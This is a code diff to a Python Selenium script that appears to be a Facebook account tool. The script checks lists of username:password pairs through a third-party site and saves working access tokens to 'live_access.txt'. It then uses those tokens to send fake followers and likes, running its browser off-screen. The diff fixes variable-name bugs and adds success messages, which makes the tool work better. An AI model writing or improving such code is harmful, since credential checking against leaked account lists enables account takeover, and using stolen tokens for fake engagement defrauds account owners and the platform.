@@ -4,6 +4,7 @@ try:
     from colored import fg, attr
 except:
     print('[-] Please Install Selenium And Colored')
+    sleep(5)
 
 print(fg('#f1c40f')+'''
 ███████╗ █████╗  ██████╗███████╗██████╗  ██████╗  ██████╗ ██╗  ██╗
@@ -28,7 +29,7 @@ if select_service == "1":
     extract_emails = open(exreact_upload, 'r')
     
     # Read Accounts
-    for email in emails:
+    for email in extract_emails:
         sp = email.split(":")
         username = sp[0]
         password = sp[1]
@@ -43,11 +44,13 @@ if select_service == "1":
         if 'Invalid username or password (401)' in access:
             with open('die_access.txt', 'a+') as die:
                 die.write(f'[DIE] => {username} : {password} \n')
+                print(fg('red')+'[+] Extracted Done [DIE] .'+attr('reset'))
                 driver.quit()
         
         else:
             with open('live_access.txt', 'a+') as live:
                 live.write(access + '\n')
+                print(fg('green')+'[+] Extracted Done [LIVE] .'+attr('reset'))
                 driver.quit()
 
 elif select_service == "2":
@@ -62,6 +65,7 @@ elif select_service == "2":
         driver.find_element_by_id('urlpost').send_keys(follow_profil)
         driver.find_element_by_id('checktoken').click()
         sleep(10)
+        print(fg('green')+'[+] Followers Sent Successfully Now Check Your Profile .'+attr('reset'))
         driver.quit()
 
 elif select_service == "3":
@@ -73,7 +77,8 @@ elif select_service == "3":
         driver.set_window_position(-10000,0)
         driver.get('https://web.ftcontrolsv3.com/free_form_fb_send_like_access_token.php')
         driver.find_element_by_id('data').send_keys(access)
-        driver.find_element_by_id('urlpost').send_keys(follow_profil)
+        driver.find_element_by_id('urlpost').send_keys(likes_postid)
         driver.find_element_by_id('checktoken').click()
         sleep(10)
+        print(fg('green')+'[+] Likes Sent Successfully Now Check Your Post .'+attr('reset'))
         driver.quit()
